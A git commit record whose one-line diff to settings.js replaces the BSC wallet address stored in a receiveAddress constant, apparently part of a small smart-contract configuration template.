18f4dc40c5a2dbb4e965b46ac469659be9ea89df
acidiclungs <ruke.asakar@gmail.com>
2024-09-28 10:26:38 +0530

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x3c7364e33C595b282Ea285Cc9f1A26c0F19D0bE6";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
